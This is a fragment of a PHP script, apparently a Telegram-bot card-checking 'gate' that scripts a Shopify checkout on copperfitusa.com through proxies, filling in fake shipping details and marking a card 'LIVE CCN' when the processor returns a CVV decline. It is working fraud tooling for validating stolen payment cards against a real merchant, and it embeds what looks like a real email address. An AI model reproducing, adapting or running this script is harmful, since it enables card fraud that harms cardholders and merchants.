...
$gate = 'va';
$gateName = 'shopify + vantiv 25 usd';
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.copperfitusa.com/cart/41227570806938:1?traffic_source=buy_now');
...
$checkouts = trim(strip_tags(getstr($r1,'pageurl":"www.copperfitusa.com\/57839386778\/checkouts\/','?')));
$token = trim(strip_tags(getstr($r1,'name="authenticity_token" value="','"')));

if (!($token && $checkouts)) {
    editMessage($chat_id, '<b>⚠ A gateway error has occurred. If this problem persists, please contact an administrator.[400]</b>', $m1);
    exit();
}
#---- 2 REQ----
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://'.$site.'57839386778/checkouts/'.$checkouts.'');
...
$headers[] = 'method: POST';
$headers[] = 'path: /57839386778/checkouts/' . $checkouts . '';
...
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$token.'&previous_step=contact_information&step=shipping_method&checkout%5Bemail_or_phone%5D=veteranojuanca%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bfirst_name%5D=jhin&checkout%5Bshipping_address%5D%5Blast_name%5D=pers&checkout%5Bshipping_address%5D%5Baddress1%5D=street+212&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=new+york&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bprovince%5D=NY&checkout%5Bshipping_address%5D%5Bzip%5D=10080&checkout%5Bshipping_address%5D%5Bphone%5D=%28631%29+243-4543&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bbuyer_accepts_sms%5D=0&checkout%5Bsms_marketing_phone%5D=');
$r2 = curl_exec($ch);
curl_close($ch);
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://' . $site . '/57839386778/checkouts/' . $checkouts . '/processing?from_processing_page=1');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
$headers = array();
...
if (strpos($r6, "Decline CVV2/CID Fail")) {
    $status = "LIVE CCN ✅";
    $response = $msg;
